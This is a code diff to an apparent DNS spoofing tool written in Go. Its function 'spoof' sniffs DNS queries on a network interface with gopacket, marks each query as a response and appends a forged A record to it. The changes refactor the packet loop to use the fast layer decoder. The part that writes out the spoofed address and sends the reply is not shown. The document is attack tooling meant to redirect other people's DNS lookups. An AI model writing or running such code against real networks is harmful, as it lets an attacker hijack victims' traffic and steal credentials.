@@ -79,8 +79,21 @@ func spoof(ifacename string) {
 	// get the channel source from the card
 	pktSource := gopacket.NewPacketSource(handle, handle.LinkType())
 
+	// pre-allocate all the space needed for the layers
+	var ethLayer	layers.Ethernet
+	var ipv4Layer	layers.IPv4
+	var udpLayer	layers.UDP
+	var dnsLayer	layers.DNS
+	var a		layers.DNSResourceRecord
+
+	// create the decoder for fast-packet decoding
+	// (using the fast decoder takes about 10% the time of normal decoding)
+	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
+
+	// this slick will hold the names of the layers successfully decoded
+	decodedLayers := make([]gopacket.LayerType, 0, 4)
+
 	// pre-create the response with most of the data filled out
-	var a layers.DNSResourceRecord
 	a.Type = layers.DNSTypeA
 	a.Class = layers.DNSClassIN
 	a.TTL = 300
@@ -89,30 +102,37 @@ func spoof(ifacename string) {
 	// Main loop for dns packets intercepted
 	for packet := range pktSource.Packets() {
 
-		// attempt to get a DNS layer out of this packet
-		dnsLayer := packet.Layer(layers.LayerTypeDNS)
-		if dnsLayer == nil {
-			continue;
+		// decode this packet using the fast decoder
+		err = decoder.DecodeLayers(packet.Data(), &decodedLayers)
+		if err != nil {
+			fmt.Println("Decoding error!")
+			continue
 		}
 
-		// get the DNS data from this layer by type assertion
-		dnsPkt := dnsLayer.(*layers.DNS)
+		// only proceed if all layers decoded
+		if len(decodedLayers) != 4 {
+			fmt.Println("Not enough layers!")
+			continue
+		}
 
 		// check that this is not a response
-		if dnsPkt.QR {
+		if dnsLayer.QR {
 			continue;
 		}
 
 		// print the question section
-		for i := uint16(0); i < dnsPkt.QDCount; i++ {
-			fmt.Println(string(dnsPkt.Questions[i].Name))
+		for i := uint16(0); i < dnsLayer.QDCount; i++ {
+			fmt.Println(string(dnsLayer.Questions[i].Name))
 		}
 
+		// set this to be a response
+		dnsLayer.QR = true
+
 		// for each question
-		for i := uint16(0); i < dnsPkt.QDCount; i++ {
+		for i := uint16(0); i < dnsLayer.QDCount; i++ {
 
 			// get the question
-			q := dnsPkt.Questions[i]
+			q := dnsLayer.Questions[i]
 
 			// verify this is an A-IN record question
 			if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
@@ -123,7 +143,7 @@ func spoof(ifacename string) {
 			a.Name = q.Name
 
 			// append the answer to the original query packet
-			dnsPkt.Answers = append(dnsPkt.Answers, a)
+			dnsLayer.Answers = append(dnsLayer.Answers, a)
 
 		}
 	}
